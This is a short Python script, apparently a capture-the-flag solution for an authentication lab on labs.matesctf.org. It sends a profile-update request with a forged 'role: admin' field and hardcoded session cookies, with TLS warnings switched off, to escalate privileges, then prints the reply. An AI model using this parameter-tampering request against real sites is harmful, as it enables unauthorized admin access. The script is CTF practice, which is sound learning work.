import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
url = "https://labs.matesctf.org/lab/auth/1/index.php?page=profile"

data = {
  "username" : "dong hai dang",
  "role" : "admin"
}
header = {
  "cookie": "__cfduid=d8d51f1869479e5242217e2cf9138d1d41602516193; PHPSESSID=9765d58edb1eff8def93a16aa5e2304c; session=ad78d9f7-4249-4291-8485-bf4c40f47121.SpwhybcXBYzlLkinymyWZ1iCMzo",
}

x = requests.post(url, data= data, headers = header)
print(x.text)